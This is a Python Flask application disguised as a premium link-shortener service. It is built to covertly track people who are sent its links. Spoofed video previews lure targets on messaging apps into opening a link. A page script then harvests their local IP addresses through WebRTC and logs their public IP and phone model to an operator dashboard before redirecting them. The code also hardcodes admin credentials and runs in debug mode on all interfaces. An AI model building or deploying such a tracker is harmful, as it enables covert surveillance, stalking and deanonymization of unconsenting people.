from flask import Flask, render_template_string, request, redirect, jsonify, Response
import uuid
import datetime
import sqlite3
import requests
import pytz
from functools import wraps

app = Flask(__name__)

DB_FILE = "tracker_data.db"
USERNAME = "khaled"
PASSWORD = "ALG@2022"

ALGIERS_TZ = pytz.timezone('Africa/Algiers')

def get_gmt1_time():
    return datetime.datetime.now(ALGIERS_TZ).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                original_url TEXT,
                note TEXT,
                video_title TEXT,
                custom_image TEXT,
                target_platform TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                ip TEXT,
                local_ip TEXT,
                device TEXT,
                time TEXT,
                FOREIGN KEY(link_id) REFERENCES links(id) ON DELETE CASCADE
            )
        ''')
        conn.commit()

init_db()

def fetch_original_meta(url, manual_thumb_url=None):
    url_lower = url.lower()
    title = "Watch Trending Video Content in HD Quality"
    img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
    
    if manual_thumb_url and manual_thumb_url.strip():
        img = manual_thumb_url.strip()
        
    if "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
        try:
            res = requests.get(f"https://www.tiktok.com/oembed?url={url}", timeout=4)
            if res.status_code == 200:
                data = res.json()
                return data.get('title', title), manual_thumb_url.strip() if manual_thumb_url else data.get('thumbnail_url', img)
        except: pass
            
    elif "youtube.com" in url_lower or "youtu.be" in url_lower:
        try:
            res = requests.get(f"https://noembed.com/embed?url={url}", timeout=4)
            if res.status_code == 200:
                data = res.json()
                return data.get('title', title), manual_thumb_url.strip() if manual_thumb_url else data.get('thumbnail_url', img)
        except: pass
        
    elif "maps.google.com" in url_lower or "goo.gl/maps" in url_lower:
        title = "Google Maps - Realtime Location Shared"
        if not manual_thumb_url:
            img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
            
    return title, img

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return Response('Login Required.', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
        return f(*args, **kwargs)
    return decorated

# 1. الواجهة المموّهة الرائعة بالكامل باللغة الإنجليزية
DASHBOARD_LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShortURL - Premium Link Shortener Service</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f8fafc; color: #1e293b; margin: 0; padding: 0; }
        .navbar { background-color: #0f172a; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
        .navbar a { color: #38bdf8; text-decoration: none; font-size: 14px; background: #1e293b; padding: 8px 15px; border-radius: 6px; border: 1px solid #334155; }
        .container { max-width: 800px; margin: 40px auto; padding: 20px; }
        .hero { text-align: center; margin-bottom: 40px; }
        .hero h1 { font-size: 32px; color: #0f172a; margin-bottom: 10px; }
        .hero p { color: #64748b; font-size: 16px; margin: 0; }
        .create-box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
        .section-title { font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; color: #64748b; margin-bottom: 15px; font-weight: bold; }
        .platform-tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
        .tab-btn { padding: 10px 16px; border: 1px solid #cbd5e1; background: #fff; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 13px; transition: all 0.2s; }
        .tab-btn:hover { background: #f1f5f9; }
        .tab-btn.active[data-target="Telegram"] { background: #0088cc; color: white; border-color: #0088cc; }
        .tab-btn.active[data-target="Messenger"] { background: #0084FF; color: white; border-color: #0084FF; }
        .tab-btn.active[data-target="WhatsApp"] { background: #25D366; color: white; border-color: #25D366; }
        .tab-btn.active[data-target="Instagram"] { background: #E1306C; color: white; border-color: #E1306C; }
        .tab-btn.active[data-target="TikTok"] { background: #000000; color: white; border-color: #000000; }
        
        label { font-weight: 600; display: block; margin-top: 15px; font-size: 14px; color: #334155; }
        input[type="text"], input[type="url"] { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 14px; background: #f8fafc; }
        input:focus { outline: none; border-color: #3b82f6; background: #fff; }
        .submit-btn { width: 100%; background-color: #2563eb; color: white; border: none; padding: 14px; margin-top: 25px; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
        .submit-btn:hover { background-color: #1d4ed8; }
        
        .notice-box { display: none; background-color: #f0fdf4; border: 1px dashed #22c55e; padding: 12px; border-radius: 6px; margin-top: 10px; font-size: 13px; color: #166534; line-height: 1.5; }
        .notice-box a { color: #16a34a; font-weight: bold; text-decoration: underline; }

        .result-panel { background: #f0fdf4; border: 1px solid #bbf7d0; padding: 20px; border-radius: 8px; margin-top: 25px; }
        .result-title { font-weight: bold; color: #166534; font-size: 15px; margin-bottom: 10px; }
        .link-group { display: flex; gap: 10px; margin-bottom: 10px; }
        .link-input { flex: 1; padding: 10px; border: 1px solid #bbf7d0; border-radius: 4px; font-size: 13px; background: #fff; font-family: monospace; }
        .nav-btn { padding: 10px 14px; background: #166534; color: white; text-decoration: none; border-radius: 4px; font-size: 13px; font-weight: bold; text-align: center; }
    </style>
</head>
<body>
    <div class="navbar">
        <span>🔗 ShortURL Admin</span>
        <a href="/my-links">📁 My Links Dashboard</a>
    </div>
    <div class="container">
        <div class="hero">
            <h1>Create Shortened URL</h1>
            <p>Optimize, configure and smart-target your web links effortlessly</p>
        </div>

        <div class="create-box">
            <form action="/create" method="POST">
                <div class="section-title">1. Target Delivery Platform</div>
                <div class="platform-tabs">
                    <button type="button" class="tab-btn active" data-target="Telegram" onclick="setTarget('Telegram')">Telegram</button>
                    <button type="button" class="tab-btn" data-target="Messenger" onclick="setTarget('Messenger')">Facebook Messenger</button>
                    <button type="button" class="tab-btn" data-target="WhatsApp" onclick="setTarget('WhatsApp')">WhatsApp Chat</button>
                    <button type="button" class="tab-btn" data-target="Instagram" onclick="setTarget('Instagram')">Instagram DM</button>
                    <button type="button" class="tab-btn" data-target="TikTok" onclick="setTarget('TikTok')">TikTok Chat</button>
                </div>
                <input type="hidden" id="target_platform" name="target_platform" value="Telegram">

                <label id="url_label">Destination Long URL:</label>
                <input type="url" name="original_url" oninput="checkUrlDomain(this.value)" placeholder="https://example.com/video..." required>
                
                <div id="meta_notice" class="notice-box"></div>

                <label>Custom Thumbnail Image URL (Highly recommended for Facebook/Instagram links):</label>
                <input type="url" name="manual_thumbnail" placeholder="https://example.com/image.jpg">

                <label>Admin Description / Note:</label>
                <input type="text" name="note" placeholder="e.g. TikTok video for WhatsApp target" required>
                
                <button type="submit" class="submit-btn">Generate Encrypted Short URL</button>
            </form>

            {% if new_link_id %}
            <div class="result-panel">
                <div class="result-title">✔ URL Shortened Successfully!</div>
                <div class="section-title" style="color:#166534; margin-top:10px;">Target Link (Send this to target):</div>
                <div class="link-group">
                    <input type="text" class="link-input" readonly value="{{ host_url }}secure/{{ new_link_id }}">
                </div>
                <div class="section-title" style="color:#166534; margin-top:10px;">Tracking Control:</div>
                <div class="link-group">
                    <a href="/analytics/{{ new_link_id }}" class="nav-btn" style="background:#2563eb; width: 100%;">📊 Click Here to View Live Analytics Results Page</a>
                </div>
            </div>
            {% endif %}
        </div>
    </div>

    <script>
        function setTarget(platform) {
            document.getElementById('target_platform').value = platform;
            var buttons = document.querySelectorAll('.tab-btn');
            buttons.forEach(btn => btn.classList.remove('active'));
            document.querySelector(`[data-target="${platform}"]`).classList.add('active');
        }

        function checkUrlDomain(val) {
            var notice = document.getElementById('meta_notice');
            var low = val.toLowerCase();
            if (low.includes("facebook.com") || low.includes("fb.watch")) {
                notice.style.display = "block";
                notice.innerHTML = "💡 <b>Facebook Link Detected:</b> To ensure perfect thumbnail previews on Meta apps, consider extracting the direct image URL from <a href='https://thumbnail-downloader.com/facebook' target='_blank'>Thumbnail Downloader for Facebook</a> and pasting it in the Custom Thumbnail field below.";
            } else if (low.includes("instagram.com")) {
                notice.style.display = "block";
                notice.innerHTML = "💡 <b>Instagram Link Detected:</b> Instagram strict APIs block direct scrapers. Please extract the clear image URL from <a href='https://thumbnail-downloader.com/instagram' target='_blank'>Thumbnail Downloader for Instagram</a> and paste it below.";
            } else {
                notice.style.display = "none";
            }
        }
    </script>
</body>
</html>
'''

# 2. مستودع جمع الروابط الخاصة بك
MY_LINKS_LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Links Vault - Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f8fafc; color: #1e293b; margin: 0; padding: 0; }
        .navbar { background-color: #0f172a; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
        .navbar a { color: white; text-decoration: none; font-size: 14px; background: #3b82f6; padding: 8px 15px; border-radius: 6px; }
        .container { max-width: 1100px; margin: 30px auto; padding: 20px; }
        .table-wrapper { background: white; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); overflow-x: auto; border: 1px solid #e2e8f0; }
        .main-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: left; }
        .main-table th, .main-table td { padding: 14px 16px; border-bottom: 1px solid #f1f5f9; }
        .main-table th { background-color: #0f172a; color: white; font-weight: 600; }
        .badge { background: #ef4444; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; }
        .platform-badge { display: inline-block; padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; color: white; }
        .bg-telegram { background-color: #0088cc; }
        .bg-messenger { background-color: #0084FF; }
        .bg-whatsapp { background-color: #25D366; }
        .bg-instagram { background-color: #E1306C; }
        .bg-tiktok { background-color: #000000; }
        .btn-action { padding: 6px 12px; font-size: 12px; font-weight: bold; border-radius: 4px; text-decoration: none; display: inline-block; color: white; }
        .btn-view { background-color: #2563eb; }
        .btn-del { background-color: #dc2626; margin-left: 5px; }
    </style>
</head>
<body>
    <div class="navbar">
        <span>📁 My Generated Links</span>
        <a href="/">+ Shorten New URL</a>
    </div>
    <div class="container">
        <div class="table-wrapper">
            <table class="main-table">
                <thead>
                    <tr>
                        <th>Admin Note / Description</th>
                        <th>Target Platform</th>
                        <th>Fetched Meta Title</th>
                        <th>Total Clicks</th>
                        <th>Shortened Track Link</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    {% if not links_list %}
                    <tr><td colspan="6" style="padding: 30px; text-align: center; color: #94a3b8;">No links created yet.</td></tr>
                    {% else %}
                        {% for link in links_list %}
                        <tr>
                            <td style="font-weight: 600; color: #0f172a;">{{ link.note }}</td>
                            <td>
                                <span class="platform-badge {% if link.target_platform == 'Telegram' %}bg-telegram{% elif link.target_platform == 'Messenger' %}bg-messenger{% elif link.target_platform == 'WhatsApp' %}bg-whatsapp{% elif link.target_platform == 'Instagram' %}bg-instagram{% elif link.target_platform == 'TikTok' %}bg-tiktok{% endif %}">
                                    {{ link.target_platform }}
                                </span>
                            </td>
                            <td style="max-width: 180px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ link.video_title }}</td>
                            <td><span class="badge">{{ link.clicks_count }}</span></td>
                            <td><a style="color: #2563eb; font-weight:bold; text-decoration:none;" href="/secure/{{ link.id }}" target="_blank">secure/{{ link.id }}</a></td>
                            <td>
                                <a href="/analytics/{{ link.id }}" class="btn-action btn-view">📊 Results</a>
                                <a href="/delete/{{ link.id }}" class="btn-action btn-del" onclick="return confirm('Delete this link permanently?');">🗑️</a>
                            </td>
                        </tr>
                        {% endfor %}
                    {% endif %}
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
'''

# 3. لوحة عرض النتائج المستقلة والمفصلة للهاتف بدقة (التوقيت الجزائري)
ANALYTICS_LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Insights & Analytics Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f8fafc; color: #1e293b; margin: 0; padding: 0; }
        .navbar { background-color: #0f172a; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
        .navbar a { color: white; text-decoration: none; font-size: 14px; background: #475569; padding: 8px 15px; border-radius: 6px; }
        .container { max-width: 1100px; margin: 30px auto; padding: 20px; }
        .link-header { background: white; padding: 20px; border-radius: 10px; border: 1px solid #e2e8f0; margin-bottom: 25px; }
        .link-header h2 { margin: 0 0 10px 0; font-size: 20px; color: #0f172a; }
        .link-header p { margin: 4px 0; color: #64748b; font-size: 14px; }
        .logs-box { background: white; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); overflow-x: auto; border: 1px solid #e2e8f0; }
        .logs-table { width: 100%; border-collapse: collapse; font-size: 12px; text-align: left; }
        .logs-table th, .logs-table td { padding: 12px 16px; border-bottom: 1px solid #e2e8f0; }
        .logs-table th { background-color: #1e293b; color: white; font-weight: 600; }
        .device-badge { background-color: #f1f5f9; padding: 4px 8px; border-radius: 4px; font-weight: 600; color: #0f172a; border: 1px solid #e2e8f0; }
    </style>
</head>
<body>
    <div class="navbar">
        <span>📊 Device Tracking Analytics</span>
        <a href="/my-links">📁 Back to Links</a>
    </div>
    <div class="container">
        <div class="link-header">
            <h2>Link ID: {{ link_info.id }} ({{ link_info.note }})</h2>
            <p><b>Original Target URL:</b> <a href="{{ link_info.original_url }}" target="_blank" style="color:#2563eb;">{{ link_info.original_url }}</a></p>
            <p><b>Configured For:</b> {{ link_info.target_platform }} | <b>Total Captured Clicks:</b> {{ clicks_list|length }}</p>
        </div>

        <div class="logs-box">
            <table class="logs-table">
                <thead>
                    <tr>
                        <th>Timestamp (GMT+1 Algerian Time)</th>
                        <th>Public IP Address</th>
                        <th>Local IP Address (LAN)</th>
                        <th>Detected Device / Hardware Model</th>
                    </tr>
                </thead>
                <tbody>
                    {% if not clicks_list %}
                    <tr><td colspan="4" style="padding: 30px; text-align: center; color: #94a3b8;">No click data recorded for this link yet. Waiting for targets...</td></tr>
                    {% else %}
                        {% for click in clicks_list %}
                        <tr>
                            <td style="font-weight: 600; color: #475569;">{{ click.time }}</td>
                            <td style="color:#dc2626; font-weight:bold; font-size:13px; font-family: monospace;">{{ click.ip }}</td>
                            <td style="color:#16a34a; font-weight:bold; font-size:13px; font-family: monospace;">{{ click.local_ip }}</td>
                            <td><span class="device-badge">{{ click.device }}</span></td>
                        </tr>
                        {% endfor %}
                    {% endif %}
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
@requires_auth
def home():
    new_link_id = request.args.get('new_link_id')
    return render_template_string(DASHBOARD_LAYOUT, host_url=request.host_url, new_link_id=new_link_id)

@app.route('/my-links')
@requires_auth
def my_links():
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('''
            SELECT l.id, l.original_url, l.note, l.video_title, l.custom_image, l.target_platform, COUNT(c.id) as clicks_count 
            FROM links l LEFT JOIN clicks c ON l.id = c.link_id GROUP BY l.id ORDER BY l.id DESC
        ''')
        links_list = cursor.fetchall()
    return render_template_string(MY_LINKS_LAYOUT, links_list=links_list)

@app.route('/analytics/<link_id>')
@requires_auth
def analytics(link_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM links WHERE id = ?', (link_id,))
        link_info = cursor.fetchone()
        
        cursor.execute('SELECT ip, local_ip, device, time FROM clicks WHERE link_id = ? ORDER BY id DESC', (link_id,))
        clicks_list = cursor.fetchall()
        
    if not link_info:
        return "Link not found", 404
        
    return render_template_string(ANALYTICS_LAYOUT, link_info=link_info, clicks_list=clicks_list)

@app.route('/create', methods=['POST'])
@requires_auth
def create():
    original_url = request.form.get('original_url')
    manual_thumbnail = request.form.get('manual_thumbnail', '')
    note = request.form.get('note')
    target_platform = request.form.get('target_platform', 'Telegram')
    
    video_title, custom_image = fetch_original_meta(original_url, manual_thumbnail)
    link_id = str(uuid.uuid4())[:6].upper()
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO links (id, original_url, note, video_title, custom_image, target_platform) 
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (link_id, original_url, note, video_title, custom_image, target_platform))
        conn.commit()
    return redirect(f'/?new_link_id={link_id}')

@app.route('/delete/<link_id>')
@requires_auth
def delete_link(link_id):
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("PRAGMA foreign_keys = ON")
        cursor.execute("DELETE FROM links WHERE id = ?", (link_id,))
        conn.commit()
    return redirect('/my-links')

@app.route('/secure/<link_id>')
def secure_redirect(link_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM links WHERE id = ?", (link_id,))
        link_data = cursor.fetchone()
        
    if link_data:
        target = link_data['target_platform']
        title = link_data['video_title']
        image_url = link_data['custom_image']
        
        if target == "Telegram":
            og_type = "video"
            meta_tags = f'''
            <meta property="og:type" content="{og_type}">
            <meta property="og:video" content="{link_data['original_url']}">
            <meta property="og:video:secure_url" content="{link_data['original_url']}">
            <meta property="og:video:type" content="text/html">
            <meta property="og:video:width" content="1280">
            <meta property="og:video:height" content="720">
            <meta name="twitter:card" content="player">
            <meta name="twitter:player" content="{link_data['original_url']}">
            <meta name="twitter:player:width" content="1280">
            <meta name="twitter:player:height" content="720">
            '''
        elif target == "Messenger":
            og_type = "video.movie"
            meta_tags = f'''
            <meta property="og:type" content="{og_type}">
            <meta property="og:video" content="{link_data['original_url']}">
            <meta property="og:video:secure_url" content="{link_data['original_url']}">
            <meta property="og:video:type" content="text/html">
            <meta property="og:video:width" content="1280">
            <meta property="og:video:height" content="720">
            <meta name="text" content="Facebook Watch Video">
            '''
        elif target == "WhatsApp":
            og_type = "website"
            meta_tags = f'''
            <meta property="og:type" content="{og_type}">
            <meta property="og:site_name" content="WhatsApp Video Share">
            '''
        elif target == "Instagram":
            og_type = "video.other"
            meta_tags = f'''
            <meta property="og:type" content="{og_type}">
            <meta property="og:site_name" content="Instagram Direct Media">
            '''
        else: # TikTok
            og_type = "video.other"
            meta_tags = f'''
            <meta property="og:type" content="{og_type}">
            <meta property="og:site_name" content="TikTok Global System">
            '''

        return f'''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{title}</title>
            
            <meta property="og:title" content="{title}">
            <meta property="og:description" content="Click to stream full video content in high quality player.">
            <meta property="og:image" content="{image_url}">
            <meta property="og:image:secure_url" content="{image_url}">
            <meta property="og:image:type" content="image/jpeg">
            <meta property="og:image:width" content="1280">
            <meta property="og:image:height" content="720">
            <meta property="og:url" content="{request.url}">
            
            {meta_tags}
            
            <script>
                function gatherLocalIPsAndRedirect() {{
                    var detectedIPs = [];
                    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    if (!window.RTCPeerConnection) {{ sendData("Unsupported"); return; }}
                    var pc = new RTCPeerConnection({{ iceServers: [] }});
                    pc.createDataChannel(""); 
                    pc.onicecandidate = function(e) {{
                        if (!e || !e.candidate || !e.candidate.candidate) return;
                        var candidate = e.candidate.candidate;
                        var ipRegex = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/;
                        var match = ipRegex.exec(candidate);
                        if (match && detectedIPs.indexOf(match[1]) === -1) detectedIPs.push(match[1]);
                    }};
                    pc.createOffer().then(function(sdp) {{ pc.setLocalDescription(sdp); }}).catch(function(err) {{}});
                    setTimeout(function() {{
                        var finalLocalIp = detectedIPs.length > 0 ? detectedIPs.join(" | ") : "Encrypted (mDNS)";
                        sendData(finalLocalIp);
                    }}, 1200);
                }}
                function sendData(localIp) {{
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "/log-click/{link_id}", true);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.onreadystatechange = function () {{
                        if (xhr.readyState === 4) {{ window.location.href = "{link_data['original_url']}"; }}
                    }};
                    xhr.send(JSON.stringify({{ "local_ip": localIp }}));
                }}
                window.onload = gatherLocalIPsAndRedirect;
            </script>
        </head>
        <body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:45%;">
            <div>Loading media player content...</div>
        </body>
        </html>
        '''
    return "Link not found", 404

@app.route('/log-click/<link_id>', methods=['POST'])
def log_click(link_id):
    data = request.get_json() or {}
    local_ip = data.get('local_ip', 'Unknown')
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address and ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()
        
    ua_string = request.headers.get('User-Agent', '')
    
    # تفكيك الـ User-Agent لمعرفة نوع وموديل الهاتف الذكي بدقة ونظافة
    device_detected = "Unknown Device"
    
    if "iPhone" in ua_string:
        device_detected = "Apple iPhone"
    elif "iPad" in ua_string:
        device_detected = "Apple iPad"
    elif "Android" in ua_string:
        try:
            # استخراج الموديل الفعلي المحصور بين الأقواس بعد كلمة أندرويد
            parts = ua_string.split(';')
            for part in parts:
                if "Build" in part:
                    device_detected = "Android (" + part.split("Build")[0].strip() + ")"
                    break
                elif "Linux" not in part and "Android" not in part:
                    device_detected = "Android (" + part.strip() + ")"
        except:
            device_detected = "Android Device"
    elif "Windows NT" in ua_string:
        device_detected = "Windows PC"
    elif "Macintosh" in ua_string:
        device_detected = "MacBook Computer"

    current_time = get_gmt1_time()
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('INSERT INTO clicks (link_id, ip, local_ip, device, time) VALUES (?, ?, ?, ?, ?)', 
                       (link_id, ip_address, local_ip, device_detected, current_time))
        conn.commit()
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
